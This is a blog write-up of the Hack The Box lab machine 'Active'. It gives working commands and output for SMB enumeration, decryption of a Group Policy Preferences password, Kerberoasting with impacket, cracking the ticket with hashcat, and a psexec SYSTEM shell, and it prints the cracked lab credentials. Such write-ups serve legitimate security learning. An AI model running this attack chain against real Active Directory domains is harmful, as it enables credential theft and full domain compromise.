---
layout: post
title: Hack The Box - Active
---

This post is an overview of my time working through the box "Active" found in [HackTheBox](https://www.hackthebox.eu)

---
[![](/assets/image/attachments/Pasted&#32;image&#32;20210707143409.png)](/assets/image/attachments/Pasted&#32;image&#32;20210707143409.png){:.glightbox}

This my second time doing an Active Directory based machine from Hack The Box having stumbled through Forest earlier this month, but this one went a lot more smoothly :)

## Enumeration
I ran rustscan followed by a full nmap scan:

> `rustscan -a 10.10.10.100 --ulimit 5000 -b 1000 -t 5000  -- -sC -sV -oN 10.10.10.100`

```bash
53/tcp    open  domain       syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-07-07 09:42:02Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5722/tcp  open  msrpc        syn-ack Microsoft Windows RPC
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        syn-ack Microsoft Windows RPC
49169/tcp open  msrpc        syn-ack Microsoft Windows RPC
49170/tcp open  msrpc        syn-ack Microsoft Windows RPC
49182/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28809/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38907/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)
```

> `nmap -p- 10.10.10.100`

```bash 
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49170/tcp open  unknown
49182/tcp open  unknown

```

## SMB Enumeration
Seeing port 445 open, I went for SMB straight away, let's see if we can perform null authentication and list some shares:

```bash
└─$ smbclient -L //10.10.10.100/    
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk 
```

now with `smbmap` to see what we have read access to:

```bash
└─$ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100       
        Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        C$                      NO ACCESS       Default share
        IPC$                    NO ACCESS       Remote IPC
        NETLOGON                NO ACCESS       Logon server share 
        Replication             READ ONLY
        SYSVOL                  NO ACCESS       Logon server share 
        Users                   NO ACCESS         
```

we can read the replication share, so I connect to it with `smbclient` and recursively list all the files:

```bash
└─$ smbclient  //10.10.10.100/Replication                                                                             
Enter WORKGROUP\kali's password:         
Anonymous login successful              
Try "help" to get a list of possible commands.         
smb: \> recurse ON
smb: \> dir  

...

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

...
```
This looks to be a replication of SYSVOL due to the Policies folder, I know xml files in here can contain Group Policy Prefences (GPP) passwords, so I download the `Groups.xml` file

inside this file we find a username and a GPP password!

```bash
...
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
...
```

now decrypt with `gpp-decrypt`

```bash
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

```

now we have credentials


 SVC_TGS:GPPstillStandingStrong2k18

## Kerberoasting
we saw earlier that port 88 was open so now that we have credentials we can attempt a technique called "Kerberoasting".
This is a very breif summary of the attack (forgive me if there are any mistakes, I am still learning!)
- we have domain credentials, this enables us to request a TGT (Ticket Granting Ticket) from the KDC (Key Distribution Center)
- Using this we can request ST (Service Tickets) from the KDC for target services
- if we receive a ticket we can crack it offline using `hashcat` or `john`

Using `GetUserSPNs.py` from the impacket suite of tools we can request tickets for all the non-machine accounts in the domain which have SPNs (Service Principal Names). It finds these accounts via LDAP and then requests a ST which will be encrypted with the user accounts password. we can take this ticket and crack it offline.

Machine accounts are ignored because they have passwords that are changed monthly and are long enough that cracking is unfeasible.

I ran the tool as follows:
```bash
└─$ /usr/bin/impacket-GetUserSPNs -target-domain active.htb -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18                                                                                                     
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                             
                                                                                                                     
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation                                                                          
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------                                                                          
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783                                                                                      
                                                                                                                     
                                                                                                                     
                                                                                                                     
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) 

```

ah, clock skew is a problem (which for some reason my nmap script failed on earlier...) we can remedy this with `rdate`
```bash
rdate -n 10.10.10.100 
```

trying again:
```bash
└─$ /usr/bin/impacket-GetUserSPNs -target-domain active.htb -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18                                                                                                     
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                                                                                                                                                   
                                                                                                                                                                                                                                           
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation                                                                          
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------                                                                          
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783                                                                                      
                                                                                                                                                                                                                                           
                                                                                                                     
                                                                                                                                                                                                                                           
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5b93b01640d5ccc906a8eb6bc8088dc3$1e08d0271d63b458c79fd3694b28103fa2271c90cae118b19aff567ab847333c4939c4065e00780a8ed8585b7994ff56beb0556ae9aed42aec6374a5b351fdfcde56ecaac1
3395552ceb02b89072b5f99ff878c6f6a13020349b5b72e8f8b57ea04ead03845aaf5b2ddb2694e9c296babdd1a1f20b6de351613bb4d9a485b29b8cc4c759a1e6b3d83cd33079be2645813079921f2e9cf4ccdccf08d251d54d617b11de72c298a5da7a01bd5947d06f9c99312a33df061ef89e69c
288ed5edbbbf2297c745c79f9df87466d93bda041e3d71e16950d3ab9fdc521a657360bc6b611bada258cfdd15e08d351af030ecda8a2552a1e2519083816d863ef286ccbbcf3c25804b4ea0b876ea24b4a766c2fdf2c4a6515e2f66d9474e854949a2e951d588ff3e6f620c34652622814fb4adcb2
acf4033c38d34dd67aa66449711968405f035aa016683f3e4c521b687b755ca333ef604066ae00310a800d26e3281e68cd74a866dfedb90ba85356800ebabaa098c6bc8bdfc420b1cf3b4169b8cb0e7c1b9711c4780e03cc4eaaf720c4ee4bd097ea6761fe18409e67cf04cf4fe2a2ae1dfc1458025
a50f42e5e56b4b409d59f12e8fccddf79d84be42670c019f057f22a443d25b67edf9d7420dc4a523d644f4a787c210901c821399c73ddaeeaed4d47128786ed40345db1f177a5a1a4d6211d159be01d874e2991a77238310ee1f55af3188f867ea619a651056fff9e3f27f133135a2351b97e3df5ca
eed8f3d48336704d5f6d8a2cd1786a7226cf0c49c18ba7a29fef8be1891fcc9347adda2b0cd8e82cc5adba530eee373f87c5aae5ecd08162df329faefe3c57d3c6165ef11f59fa3591f89c1953b4ad1da669446e7da097cee0710af46eed4d7aa5c9298bd8155bebc4d9c9997941127ac619751b379
f2a560cb0e93d08cb9cbfe9ee30e60e6cd17b810db82dbaabd5870a5b22f41ef123c4cc6150cae43901d31c1682f535bd742c452642b3b131cc26afe0d93a16959bf5f357d1ffe53961272f1868b94b8344bb31412b101fa19083f6a0ead65f4a791de9ddfcd40c11a39f64c5c29e7a1cba768d54ee
90675eddd70a3dad27b7bbf1fd34f97affb27247cf5d4f85015d4f12e1ef2bb2f03dd888a6d0238c32ed3700189985e853756667d657e0c3d45d9d58113f36f043238b05990beed91f4dc99f472784948741b30301f52b9f050961a1a7dab723430fc84093d6f0d7170a374c415355219a99dc01 
```

we get a ST for the Administrator account! now to crack it...

first I found the required mode to use in `hashcat`
```bash
└─$ hashcat --example-hashes | grep '$krb5tgs$23' -A2 -B2
MODE: 13100
TYPE: Kerberos 5, etype 23, TGS-REP
HASH: $krb5tgs$23$*user$realm$test/spn*$b548e10f5694ae018d7ad63c257af7dc$35e8e45658860bc31a859b41a08989265f4ef8afd75652ab4d7a30ef151bf6350d879ae189a8cb769e01fa573c6315232b37e4bcad9105520640a781e5fd85c09615e78267e494f433f067cc6958200a82f70627ce0eebc2ac445729c2a8a0255dc3ede2c4973d2d93ac8c1a56b26444df300cb93045d05ff2326affaa3ae97f5cd866c14b78a459f0933a550e0b6507bf8af27c2391ef69fbdd649dd059a4b9ae2440edd96c82479645ccdb06bae0eead3b7f639178a90cf24d9a
PASS: hashcat
```

now to crack:
```bash
hashcat -m 13100 -a 0 --force admin.hash /usr/share/wordlists/rockyou.txt
```

relatively quickly, we get a crack!

```bash
└─$ hashcat -m 13100 loot/admin.hash --show              
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5b93b01640d5ccc906a8eb6bc8088dc3$1e08d0271d63b458c79fd3694b28103fa2271c90cae118b19aff567ab847333c4939c4065e00780a8ed8585b7994ff56beb0556ae9aed42aec6374a5b351fdfcde56ecaac13395552ceb02b89072b5f99ff878c6f6a13020349b5b72e8f8b57ea04ead03845aaf5b2ddb2694e9c296babdd1a1f20b6de351613bb4d9a485b29b8cc4c759a1e6b3d83cd33079be2645813079921f2e9cf4ccdccf08d251d54d617b11de72c298a5da7a01bd5947d06f9c99312a33df061ef89e69c288ed5edbbbf2297c745c79f9df87466d93bda041e3d71e16950d3ab9fdc521a657360bc6b611bada258cfdd15e08d351af030ecda8a2552a1e2519083816d863ef286ccbbcf3c25804b4ea0b876ea24b4a766c2fdf2c4a6515e2f66d9474e854949a2e951d588ff3e6f620c34652622814fb4adcb2acf4033c38d34dd67aa66449711968405f035aa016683f3e4c521b687b755ca333ef604066ae00310a800d26e3281e68cd74a866dfedb90ba85356800ebabaa098c6bc8bdfc420b1cf3b4169b8cb0e7c1b9711c4780e03cc4eaaf720c4ee4bd097ea6761fe18409e67cf04cf4fe2a2ae1dfc1458025a50f42e5e56b4b409d59f12e8fccddf79d84be42670c019f057f22a443d25b67edf9d7420dc4a523d644f4a787c210901c821399c73ddaeeaed4d47128786ed40345db1f177a5a1a4d6211d159be01d874e2991a77238310ee1f55af3188f867ea619a651056fff9e3f27f133135a2351b97e3df5caeed8f3d48336704d5f6d8a2cd1786a7226cf0c49c18ba7a29fef8be1891fcc9347adda2b0cd8e82cc5adba530eee373f87c5aae5ecd08162df329faefe3c57d3c6165ef11f59fa3591f89c1953b4ad1da669446e7da097cee0710af46eed4d7aa5c9298bd8155bebc4d9c9997941127ac619751b379f2a560cb0e93d08cb9cbfe9ee30e60e6cd17b810db82dbaabd5870a5b22f41ef123c4cc6150cae43901d31c1682f535bd742c452642b3b131cc26afe0d93a16959bf5f357d1ffe53961272f1868b94b8344bb31412b101fa19083f6a0ead65f4a791de9ddfcd40c11a39f64c5c29e7a1cba768d54ee90675eddd70a3dad27b7bbf1fd34f97affb27247cf5d4f85015d4f12e1ef2bb2f03dd888a6d0238c32ed3700189985e853756667d657e0c3d45d9d58113f36f043238b05990beed91f4dc99f472784948741b30301f52b9f050961a1a7dab723430fc84093d6f0d7170a374c415355219a99dc01:Ticketmaster1968

```


Administrator:Ticketmaster1968

Now we can use another impacket tool, `psexec` to get a shell as system

```bash
└─$ /usr/bin/impacket-psexec -dc-ip 10.10.10.100 'active.htb/administrator:Ticketmaster1968@active'                                                                                                                                    1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on active.....
[*] Found writable share ADMIN$
[*] Uploading file ASRfsqNU.exe
[*] Opening SVCManager on active.....
[*] Creating service dpav on active.....
[*] Starting service dpav.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system


```

Now just collect the flags!
```txt
user: 86d6****************************
root: b5fc****************************
```
